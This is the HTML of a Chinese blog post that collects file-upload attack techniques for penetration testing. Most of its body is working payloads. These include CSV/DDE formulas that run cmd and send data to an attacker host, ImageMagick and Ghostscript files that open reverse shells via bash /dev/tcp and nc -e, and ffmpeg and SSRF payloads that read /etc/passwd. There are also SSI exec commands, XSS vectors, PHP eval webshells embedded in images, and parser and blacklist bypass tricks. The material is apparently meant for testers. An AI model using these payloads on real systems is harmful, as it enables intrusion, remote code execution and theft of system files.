@@ -1,0 +1,1342 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+</script>
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="渗透测试,文件上传," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="瓦都剋" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.1" />
+
+
+
+
+
+
+<meta name="description" content="上传文件名fuzz字典根据语言、解析漏洞、中间件、系统特性以及一些绕过WAF的方法：黑名单、大小写、ADS流、截断、空格、长度、htaccess等生存文件名字典。 Gayhub：https://github.com/c0ny1/upload-fuzz-dic-builder 上传excel文档进行CSV注入比较老了，学习下也没啥坏处 123=cmd|&apos;/c calc&apos;!A0=MSEXCEL|&apos;\.">
+<meta name="keywords" content="渗透测试,文件上传">
+<meta property="og:type" content="article">
+<meta property="og:title" content="渗透测试中文件上传技巧">
+<meta property="og:url" content="http://byd.dropsec.xyz/2019/05/18/渗透测试中文件上传技巧/index.html">
+<meta property="og:site_name" content="瓦都剋">
+<meta property="og:description" content="上传文件名fuzz字典根据语言、解析漏洞、中间件、系统特性以及一些绕过WAF的方法：黑名单、大小写、ADS流、截断、空格、长度、htaccess等生存文件名字典。 Gayhub：https://github.com/c0ny1/upload-fuzz-dic-builder 上传excel文档进行CSV注入比较老了，学习下也没啥坏处 123=cmd|&apos;/c calc&apos;!A0=MSEXCEL|&apos;\.">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-05-18T02:40:46.700Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="渗透测试中文件上传技巧">
+<meta name="twitter:description" content="上传文件名fuzz字典根据语言、解析漏洞、中间件、系统特性以及一些绕过WAF的方法：黑名单、大小写、ADS流、截断、空格、长度、htaccess等生存文件名字典。 Gayhub：https://github.com/c0ny1/upload-fuzz-dic-builder 上传excel文档进行CSV注入比较老了，学习下也没啥坏处 123=cmd|&apos;/c calc&apos;!A0=MSEXCEL|&apos;\.">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"hide","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"输入关键词进行搜索","hits_empty":"找不到关于“${query}”的文章","hits_stats":"共找到 ${hits} 篇文化在那个，花了 ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://byd.dropsec.xyz/2019/05/18/渗透测试中文件上传技巧/"/>
+
+
+
+
+
+  <title>渗透测试中文件上传技巧 | 瓦都剋</title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?61c879c1c104a92aab1d6e4b6888ffe5";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">瓦都剋</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Looking at yourself from a different Angle!</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-weixin">
+          <a href="/wx" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            menu.weixin
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-daohang">
+          <a href="/daohang" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-globe"></i> <br />
+            
+            导航
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://byd.dropsec.xyz/2019/05/18/渗透测试中文件上传技巧/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="瓦都剋">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="瓦都剋">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">渗透测试中文件上传技巧</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-05-18T10:29:04+08:00">
+                2019-05-18
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/05/18/渗透测试中文件上传技巧/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2019/05/18/渗透测试中文件上传技巧/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计</span>
+                
+                <span title="字数统计">
+                  1,152
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  6
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="上传文件名fuzz字典"><a href="#上传文件名fuzz字典" class="headerlink" title="上传文件名fuzz字典"></a>上传文件名fuzz字典</h3><p>根据语言、解析漏洞、中间件、系统特性以及一些绕过WAF的方法：黑名单、大小写、ADS流、截断、空格、长度、htaccess等生存文件名字典。</p>
+<p>Gayhub：<a href="https://github.com/c0ny1/upload-fuzz-dic-builder" target="_blank" rel="external">https://github.com/c0ny1/upload-fuzz-dic-builder</a></p>
+<h3 id="上传excel文档进行CSV注入"><a href="#上传excel文档进行CSV注入" class="headerlink" title="上传excel文档进行CSV注入"></a>上传excel文档进行CSV注入</h3><p>比较老了，学习下也没啥坏处</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">=cmd|<span class="string">'/c calc'</span>!A0</div><div class="line">=MSEXCEL|<span class="string">'\..\..\..\Windows\System32\cmd.exe /c calc.exe'</span>!<span class="string">''</span></div><div class="line">=HYPERLINK(<span class="string">"http://vpsip?test="</span>&amp;A2&amp;A3,<span class="string">"Error: Please click me!"</span>)</div></pre></td></tr></table></figure>
+<h3 id="上传excel、word进行xxe"><a href="#上传excel、word进行xxe" class="headerlink" title="上传excel、word进行xxe"></a>上传excel、word进行xxe</h3><p>修改word、excel解压之后xml文件，加入payload</p>
+<p>Gayhub: <a href="https://github.com/BuffaloWill/oxml_xxe" target="_blank" rel="external">https://github.com/BuffaloWill/oxml_xxe</a></p>
+<p>在线生成: <a href="https://buer.haus/xxegen/" target="_blank" rel="external">https://buer.haus/xxegen/</a></p>
+<h3 id="上传mp4-avi利用ffmpeg文件读取-SSRF"><a href="#上传mp4-avi利用ffmpeg文件读取-SSRF" class="headerlink" title="上传mp4/avi利用ffmpeg文件读取/SSRF"></a>上传mp4/avi利用ffmpeg文件读取/SSRF</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#EXTM3U</span></div><div class="line"><span class="comment">#EXT-X-MEDIA-SEQUENCE:0</span></div><div class="line"><span class="comment">#EXTINF:10.0,</span></div><div class="line">concat:http://xx.oo/header.m3u8|file:///etc/passwd</div><div class="line"><span class="comment">#EXT-X-ENDLIST</span></div></pre></td></tr></table></figure>
+<h3 id="上传imagemagic文件进行命令执行"><a href="#上传imagemagic文件进行命令执行" class="headerlink" title="上传imagemagic文件进行命令执行"></a>上传imagemagic文件进行命令执行</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">push graphic-context</div><div class="line">viewbox 0 0 640 480</div><div class="line">fill <span class="string">'url(https://oo.xx/1.jpg"|bash -i &gt;&amp; /dev/tcp/127.0.0.1/2233 0&gt;&amp;1")'</span></div><div class="line">pop graphic-context</div></pre></td></tr></table></figure>
+<h3 id="上传Ghostscript文件进行命令执行"><a href="#上传Ghostscript文件进行命令执行" class="headerlink" title="上传Ghostscript文件进行命令执行"></a>上传Ghostscript文件进行命令执行</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">%!PS</div><div class="line">userdict /setpagedevice undef</div><div class="line">legal</div><div class="line">&#123; null restore &#125; stopped &#123; pop &#125; <span class="keyword">if</span></div><div class="line">legal</div><div class="line">mark /OutputFile (%pipe%$(nc -e /bin/sh <span class="number">127.0</span>.<span class="number">0.1</span> <span class="number">2333</span>)) currentdevice putdeviceprops</div></pre></td></tr></table></figure>
+<h3 id="上传svg文件进行ssrf"><a href="#上传svg文件进行ssrf" class="headerlink" title="上传svg文件进行ssrf"></a>上传svg文件进行ssrf</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xm l version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span> standalone=<span class="string">"no"</span><span class="meta">?&gt;</span></span><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xm</span> <span class="attr">lns:svg</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">xm</span> <span class="attr">lns</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">xm</span> <span class="attr">lns:xlink</span>=<span class="string">"http://www.w3.org/1999/xlink"</span> <span class="attr">width</span>=<span class="string">"200"</span> <span class="attr">height</span>=<span class="string">"200"</span>&gt;</span><span class="tag">&lt;<span class="name">image</span> <span class="attr">height</span>=<span class="string">"30"</span> <span class="attr">width</span>=<span class="string">"30"</span> <span class="attr">xlink:href</span>=<span class="string">"http://vps_ip.:2333/"</span> /&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></div></pre></td></tr></table></figure>
+<h3 id="上传svg文件进行xss"><a href="#上传svg文件进行xss" class="headerlink" title="上传svg文件进行xss"></a>上传svg文件进行xss</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">"&gt;<span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">onload</span>=<span class="string">"alert(document.domain)"</span>/&gt;</span>"&gt;<span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">document.write(document.location)</span>&gt;</span></div></pre></td></tr></table></figure>
+<h3 id="上传webp后缀进行文件进行xss"><a href="#上传webp后缀进行文件进行xss" class="headerlink" title="上传webp后缀进行文件进行xss"></a>上传webp后缀进行文件进行xss</h3><p>容器无法处理原因，其他后缀同理</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">'XSS'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">code</span>=<span class="string">"javascript:alert(1)"</span> <span class="attr">invokeurls</span>=<span class="string">"false"</span> <span class="attr">allownetworking</span>=<span class="string">"none"</span> <span class="attr">allowscriptaccess</span>=<span class="string">"never"</span> <span class="attr">loop</span>=<span class="string">"false"</span> <span class="attr">menu</span>=<span class="string">"false"</span> <span class="attr">play</span>=<span class="string">"false"</span> <span class="attr">type</span>=<span class="string">"application/x-shockwave-flash"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">javascript:alert(</span>"<span class="attr">XSS</span>")&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div></pre></td></tr></table></figure>
+<h3 id="上传shtml进行SSI"><a href="#上传shtml进行SSI" class="headerlink" title="上传shtml进行SSI"></a>上传shtml进行SSI</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">code</span>=<span class="string">"javascript:alert(1)"</span> <span class="attr">invokeurls</span>=<span class="string">"false"</span> <span class="attr">allownetworking</span>=<span class="string">"none"</span> <span class="attr">allowscriptaccess</span>=<span class="string">"never"</span> <span class="attr">loop</span>=<span class="string">"false"</span> <span class="attr">menu</span>=<span class="string">"false"</span> <span class="attr">play</span>=<span class="string">"false"</span> <span class="attr">type</span>=<span class="string">"application/x-shockwave-flash"</span>&gt;</span></div><div class="line"><span class="comment">&lt;!--#exec cmd="/bin/ls /" --&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></div><div class="line"><span class="comment">&lt;!--#exec cmd="cat /etc/passwd" --&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></div><div class="line"><span class="comment">&lt;!--#exec cmd="find / -name *.* -print" --&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div></pre></td></tr></table></figure>
+<h3 id="上传html，phtml等进行XSS"><a href="#上传html，phtml等进行XSS" class="headerlink" title="上传html，phtml等进行XSS"></a>上传html，phtml等进行XSS</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">'XSS'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">code</span>=<span class="string">"javascript:alert(1)"</span> <span class="attr">invokeurls</span>=<span class="string">"false"</span> <span class="attr">allownetworking</span>=<span class="string">"none"</span> <span class="attr">allowscriptaccess</span>=<span class="string">"never"</span> <span class="attr">loop</span>=<span class="string">"false"</span> <span class="attr">menu</span>=<span class="string">"false"</span> <span class="attr">play</span>=<span class="string">"false"</span> <span class="attr">type</span>=<span class="string">"application/x-shockwave-flash"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">javascript:alert(</span>"<span class="attr">XSS</span>")&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div></pre></td></tr></table></figure>
+<h3 id="对上传文件进行导出excel的地方插入payload进行csv注入"><a href="#对上传文件进行导出excel的地方插入payload进行csv注入" class="headerlink" title="对上传文件进行导出excel的地方插入payload进行csv注入"></a>对上传文件进行导出excel的地方插入payload进行csv注入</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">=cmd|<span class="string">' /C id'</span>!A0</div><div class="line">@cmd|<span class="string">'/C id'</span>!A0</div></pre></td></tr></table></figure>
+<h3 id="上传文件时如果转换时比如转成PDF等文件，尝试在上传文件中加入payload进行SSRF"><a href="#上传文件时如果转换时比如转成PDF等文件，尝试在上传文件中加入payload进行SSRF" class="headerlink" title="上传文件时如果转换时比如转成PDF等文件，尝试在上传文件中加入payload进行SSRF"></a>上传文件时如果转换时比如转成PDF等文件，尝试在上传文件中加入payload进行SSRF</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"file:///etc/passwd"</span> <span class="attr">width</span>=<span class="string">400height</span>=<span class="string">400/</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"file:///c:/windows/win.ini"</span>  <span class="attr">width</span>=<span class="string">400height</span>=<span class="string">400/</span>&gt;</span></div><div class="line">"&gt;<span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">document.write(document.location)</span>&gt;</span></div></pre></td></tr></table></figure>
+<h3 id="文件上传时，修改正在上传中的-input-type-为URL，尝试SSRF"><a href="#文件上传时，修改正在上传中的-input-type-为URL，尝试SSRF" class="headerlink" title="文件上传时，修改正在上传中的 input type 为URL，尝试SSRF"></a>文件上传时，修改正在上传中的 input type 为URL，尝试SSRF</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">id</span>=<span class="string">"upload_file"</span> <span class="attr">name</span>=<span class="string">"upload_file[]"</span> <span class="attr">class</span>=<span class="string">"file"</span> <span class="attr">size</span>=<span class="string">1</span> <span class="attr">multiple</span>=<span class="string">""</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>改成</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"url"</span> <span class="attr">id</span>=<span class="string">"upload_file"</span> <span class="attr">name</span>=<span class="string">"upload_file[]"</span> <span class="attr">class</span>=<span class="string">"file"</span> <span class="attr">size</span>=<span class="string">1</span> <span class="attr">multiple</span>=<span class="string">""</span>&gt;</span></div><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span> standalone=<span class="string">"no"</span><span class="meta">?&gt;</span></span><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns:svg</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">xmlns:xlink</span>=<span class="string">"http://www.w3.org/1999/xlink"</span> <span class="attr">width</span>=<span class="string">"200"</span> <span class="attr">height</span>=<span class="string">"200"</span>&gt;</span><span class="tag">&lt;<span class="name">image</span> <span class="attr">height</span>=<span class="string">"30"</span> <span class="attr">width</span>=<span class="string">"30"</span> <span class="attr">xlink:href</span>=<span class="string">"http://vpsip:2333/"</span> /&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></div></pre></td></tr></table></figure>
+<h3 id="上传文件名XSS"><a href="#上传文件名XSS" class="headerlink" title="上传文件名XSS"></a>上传文件名XSS</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span>.png</div><div class="line">"&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span>.png</div><div class="line">"&gt;<span class="tag">&lt;<span class="name">svg</span> <span class="attr">onmouseover</span>=<span class="string">alert(1)</span>&gt;</span>.svg</div></pre></td></tr></table></figure>
+<h3 id="上传图片里面注入Code"><a href="#上传图片里面注入Code" class="headerlink" title="上传图片里面注入Code"></a>上传图片里面注入Code</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">exiv2 -c<span class="string">'A "&lt;?php system($_REQUEST['</span>cmd<span class="string">']);?&gt;"!'</span> backdoor.jpeg</div><div class="line">exiftool <span class="string">"-comment&lt;=back.php"</span> back.png</div></pre></td></tr></table></figure>
+<h3 id="图片属性XSS"><a href="#图片属性XSS" class="headerlink" title="图片属性XSS"></a>图片属性XSS</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">exiftool -Artist=<span class="string">'"&gt;&lt;img src=1 onerror=alert(1)&gt;'</span> poc.jpeg</div></pre></td></tr></table></figure>
+<h3 id="上传文件名SQL注入"><a href="#上传文件名SQL注入" class="headerlink" title="上传文件名SQL注入"></a>上传文件名SQL注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">move_uploaded_file()上传文件时，把文件名更改为语句，可能会存在xss或者sql注入</div></pre></td></tr></table></figure>
+<h3 id="IIS-7-0-IIS-7-5-Nginx-lt-8-03畸形解析漏洞"><a href="#IIS-7-0-IIS-7-5-Nginx-lt-8-03畸形解析漏洞" class="headerlink" title="IIS 7.0/IIS 7.5/ Nginx &lt;8.03畸形解析漏洞"></a><code>IIS 7.0/IIS 7.5/</code> <code>Nginx &lt;8.03</code>畸形解析漏洞</h3><p>Nginx在默认Fast-CGI开启状况下,上传一个名字为<code>poc.jpg</code>，内容为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?PHP</span> fputs(fopen(<span class="string">'shell.php'</span>,<span class="string">'w'</span>),<span class="string">'&lt;?php eval($_POST[cmd])?&gt;'</span>);<span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>的文件，然后访问poc.jpg/.php,在这个目录下就会生成一句话木马 shell.php</p>
+<h3 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h3><p>上传的文件命名为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">test.php.x1.x2.x3 <span class="comment"># Apache是从右往左判断后缀</span></div></pre></td></tr></table></figure>
+<h3 id="Windows系统特性"><a href="#Windows系统特性" class="headerlink" title="Windows系统特性"></a>Windows系统特性</h3><p>在windows环境下，<code>xx.php[空格]</code> 或<code>xx.php.</code>这类文件都是不允许存在的，若这样命名，windows会默认除去空格或点，可以通过抓包，在文件名后加一个空格或者点绕过黑名单。</p>
+<h3 id="上传-htaccess文件"><a href="#上传-htaccess文件" class="headerlink" title="上传.htaccess文件"></a>上传<code>.htaccess</code>文件</h3><p>如果在Apache中<code>.htaccess</code>可被执行.且可被上传.那可以尝试在<code>.htaccess</code>中写入:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;FilesMatch <span class="string">"shell.jpg"</span>&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt;</div><div class="line">或者</div><div class="line">AddType application/x-httpd-php .png</div></pre></td></tr></table></figure>
+<h3 id="Windows下利用ADS流上传文件"><a href="#Windows下利用ADS流上传文件" class="headerlink" title="Windows下利用ADS流上传文件"></a>Windows下利用ADS流上传文件</h3><p>上传文件名为：<code>1.php::$data</code></p>
+<h3 id="IIS6截断"><a href="#IIS6截断" class="headerlink" title="IIS6截断"></a>IIS6截断</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">分号截断<span class="selector-tag">asp</span><span class="selector-class">.asp</span>;<span class="selector-tag">asp</span><span class="selector-class">.jpg</span></div></pre></td></tr></table></figure>
+<h3 id="双文件上传"><a href="#双文件上传" class="headerlink" title="双文件上传"></a>双文件上传</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">filename</span>=<span class="string">"a.txt"</span>;<span class="attribute">f</span><span class="attribute">i</span><span class="attribute">l</span><span class="attribute">e</span><span class="attribute">n</span><span class="attribute">a</span><span class="attribute">m</span><span class="attribute">e</span>=<span class="string">"a.php"</span></div></pre></td></tr></table></figure>
+<h3 id="JSON利用"><a href="#JSON利用" class="headerlink" title="JSON利用"></a>JSON利用</h3><p>参数中有存在json字符串，可以利用fastjson、jackson等漏洞利用</p>
